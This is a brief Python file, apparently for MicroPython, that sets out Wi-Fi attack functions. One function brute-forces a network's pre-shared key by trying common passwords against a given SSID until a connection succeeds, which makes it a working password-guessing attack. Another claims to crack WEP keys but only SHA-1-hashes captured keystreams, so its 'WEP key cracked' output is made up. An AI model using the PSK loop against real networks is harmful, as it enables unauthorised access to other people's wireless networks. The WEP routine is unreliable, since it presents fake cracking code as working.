from hashlib import sha1

def wep_crack(packets):
    """Crack WEP keys using captured packets."""
    print("Analyzing WEP packets...")
    iv_key_streams = [packet.get("iv_key_stream") for packet in packets if "iv_key_stream" in packet]
    if len(iv_key_streams) >= 10:
        wep_key = sha1(b''.join(iv_key_streams)).hexdigest()[:16]
        print(f"WEP key cracked: {wep_key}")
        return wep_key
    print("Not enough IVs to crack WEP.")
    return None

def weak_psk_exploit(ssid, common_passwords):
    """Check for weak PSK configurations."""
    for password in common_passwords:
        print(f"Testing PSK: {password}")
        if test_connection(ssid, password):
            print(f"Weak PSK found: {password}")
            return password
    print("No weak PSK found.")
    return None

import network
import time

def test_connection(ssid, password):
    """
    Attempt to connect to a WiFi network using the given SSID and password.

    Args:
        ssid (str): The WiFi network's SSID.
        password (str): The WiFi password.

    Returns:
        bool: True if the connection is successful, False otherwise.
    """
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)

    print(f"Attempting to connect to SSID: {ssid} with password: {password}")
    wlan.connect(ssid, password)

    start_time = time.time()
    while not wlan.isconnected():
        if time.time() - start_time > 10:
            print("Connection timed out.")
            wlan.active(False)
            return False
        time.sleep(0.5)

    print(f"Successfully connected to {ssid}.")
    wlan.active(False)
    return True
